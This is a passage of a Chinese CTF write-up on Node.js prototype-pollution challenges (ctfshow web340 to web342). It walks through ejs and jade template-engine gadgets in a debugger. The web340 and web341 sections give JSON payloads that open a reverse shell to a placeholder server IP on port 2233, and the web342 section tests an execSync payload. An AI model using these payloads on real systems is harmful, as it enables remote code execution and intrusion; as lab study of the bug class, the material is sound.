+<p>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</p>
+<p>还有一个其他解，见 web338 中的 <code>ejs</code> RCE，一样的EXP、步骤和利用方式</p>
+<h2 id="web340-原型连污染"><a href="#web340-原型连污染" class="headerlink" title="web340 原型连污染 ++"></a>web340 原型连污染 ++</h2><span class='btn'><a class="button"  title='nodejs/v10.19.0'><i class='fas fa-tag'></i>nodejs/v10.19.0</a></span>
+
+<p>题目描述处蓝奏云下载源码</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619848191941-9137aba3-47fd-43b8-a3d5-7a2ff56cf183.zip">📎web340.zip</a></p>
+<p>提取关键部分</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.copy(user.userinfo,req.body);</span><br><span class="line"><span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现 <code>userinfo</code> 的原型不是 <code>Object</code> 对象， <code>userinfo.__proto__.__proto__</code> 才是 <code>Object</code> 对象。</p>
+<p>和 web339 一样，只不过要套两层才能污染 <code>Object</code> 对象，同样用原生 socket，服务端监听端口为 <code>2233</code> （</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样 POST 一下 /login 接口污染 <code>query</code> 对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>POST 一下 /api 接口触发</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>获取 flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<h2 id="web341-原型链污染"><a href="#web341-原型链污染" class="headerlink" title="web341 原型链污染 +++"></a>web341 原型链污染 +++</h2><p>题目描述处蓝奏云下载源码</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619850192491-23fb3969-02f6-4e21-9ec9-8b8f88691980.zip">📎web341.zip</a></p>
+<p>这题和其他不同的是没有 <code>/api</code> 接口触发污染点了，所以使用 web338 中的 <code>ejs</code> RCE。</p>
+<p>然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 <code>2233</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里的前面的 <code>_tmp1;</code> 和后面的 <code>var __tmp2</code> 不能删，web338 <a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">evil0</a> 的分析有体现到，是为了闭合代码。</p>
+<p>同样 POST 一下 /login 接口污染数据</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>然后请求一个会调用 <code>render</code> 方法的接口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>即可获得 flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<h2 id="web342-原型链污染"><a href="#web342-原型链污染" class="headerlink" title="web342 原型链污染 ++++"></a>web342 原型链污染 ++++</h2><p>题目描述处蓝奏云下载源码</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619851833054-73b176d1-8460-439c-b5a4-bfe106363cda.zip">📎web342.zip</a></p>
+<p>然后还有个提示</p>
+<blockquote>
+<p>审计了1个小时发现的，此链目前网上未公开，难度稍大</p>
+</blockquote>
+<p>本题就不是用 <code>ejs</code> 进行模板渲染了，而是使用了 <code>jade</code></p>
+<p>一开始想看其他师傅的文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<p>emm，但是发现说的每个字都认识，连起来就觉得有点莫名其妙了。。于是想着先自己手动分析一下，熟悉一波，方便自己和师傅在同一个频道上，防止师傅说的每句话都感觉莫名其妙…</p>
+<p>详细的断点分析参考</p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p>
+<p>这里用 VS Code 来 debug 分析</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>就会自动创建这样一个文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pwa-node&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Launch Program&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;skipFiles&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;&lt;node_internals&gt;/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/bin/www&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后下个断点，运行一下，访问网页就可以开始愉快的 debug 了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>这里直接用 ctfshow web342 的代码进行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>依次进入 <code>res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>入口是 <code>rederFile</code> 方法，注意 <code>renderFile</code> 函数返回值可执行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>进入 <code>handleTemplateCache</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>进入 <code>compile</code> 函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>205行 有个 <code>parse</code> 解析，可以看到结果返回到 <code>parsed</code>，又传递给了 <code>fn</code>，先不管 <code>parse</code> 方法，继续向下看代码</p>
+<p>218行 这里就比较有趣了，有个看似可控的代码执行（new Function，这个在 web339 有提到）</p>
+<p>进入 <code>parse</code> 看看返回值中是否有可控部分</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p><code>parse</code> 方法内部可以看到先内部 <code>parse</code> 再内部 <code>compile</code>，内部 <code>parse</code> 结果最终会被拼接到外层 <code>parse</code> 函数返回值部分</p>
+<p>即 114行的 <code>js对象</code> 被拼接到 148行 或 149行的 <code>js对象</code> 里，最终拼接到 <code>body键</code> 返回</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>先跟进 <code>114行</code> 的 <code>compile</code> 方法，发现本方法返回的是 <code>buf</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>跟进 66行的 <code>this.visit(this.node);</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现可控（因为 <code>node.filename</code> 被 <code>utils.stringify()</code> 了）的 <code>node.line</code> 可以被 <code>push</code> 到 <code>buf</code> 中，条件是 <code>this.debug=true</code></p>
+<p>然后在 212行的 <code>this.visitNode(node);</code> 去遍历 ast 树，遍历完后回到 <code>compile</code> 方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>可以看到 <code>node.line</code> 被记录到 fn 中，然后通过 <code>Function</code> 调用执行这部分代码。</p>
+<p>也就是说如果我们可以污染 <code>node.line</code> 就可以运行我们代码。</p>
+<p>也就是说 <code>jade</code> 本身是没有漏洞的，因为模板的渲染逻辑是如何，但问题是，如果存在可控的原型链污染，就可以帮助我们污染 <code>node.line</code> 。</p>
+<p>于是尝试 POST <code>/login</code> 接口</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>断点发现，， <code>node.line</code> 值还是 <code>0</code>、<code>1</code>、<code>2</code> 之类的？</p>
+<p>突然醒悟，，还有一个问题，我们在调试过程中发现，<code>node.line</code> 是存在值的，比如上图中的 <code>0</code>、<code>1</code>、<code>2</code> ，如果存在值的话，它会直接获取这个值，而不是获取我们污染过的 <code>Object</code> 对象里的值！</p>
+<p>其实原型链污染的利用核心就是：访问对象的属性/值为 undefined 才行，不然我们污染 <code>Object</code> 对象就没有意义了。</p>
+<p>现在看这篇文章就能看懂了，而且发现总结的非常好。。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<p>好的，在同一频道上了。</p>
+<p>先梳理上面分析的函数调用栈，我们断点入口在 <code>routes/index.js</code> <code>res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;);</code> ，调用栈如下</p>
+<ol>
+<li><p>routes/index.js :: res.render</p>
+</li>
+<li><p>jade/lib/index.js :: exports.__express</p>
+</li>
+<li><p>jade/lib/index.js :: exports.renderFile</p>
+</li>
+<li><ol>
+<li>jade/lib/index.js :: handleTemplateCache</li>
+</ol>
+</li>
+<li><p>jade/lib/index.js :: exports.compile</p>
+</li>
+<li><ol>
+<li>jade/lib/index.js :: parse -&gt; compiler.compile();</li>
+</ol>
+</li>
+<li><ol>
+<li><ol>
+<li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li>
+<li>jade/lib/compiler.js :: this.visit</li>
+<li>jade/lib/compiler.js :: this.buf.push</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><ol>
+<li>jade/lib/index.js :: parse -&gt; options.self</li>
+<li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li>
+<li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li>
+</ol>
+</li>
+</ol>
+<p>至 4. a. iii. 这部分调用栈用下图，4. b. c. d. 的在上面 debug 也有提及，因此调用栈这部分问题不大</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>问题有 3</p>
+<ol>
+<li><code>visit</code> 方法中 <code>this.debug=true</code> ，不然 <code>this.buf.push</code> 调用不了</li>
+<li>在上面提到的：<code>node.line</code> 在某处为 <code>undefined</code> 才行，不然我们污染的 <code>Object</code> 对象就没意义</li>
+<li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li>
+</ol>
+<p>第 1 个问题容易解决，因为在 Jade 入口 <code>exports.__express</code> ，我们上面 deubg 分析时也看到</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.__express = <span class="function"><span class="keyword">function</span> (<span class="params">path, options, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (options.compileDebug == <span class="literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    options.compileDebug = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exports</span>.renderFile(path, options, fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式（经分析，<code>this.debug</code> 获取的就是这里的 debug 值），当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code>  导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置，2333。</p>
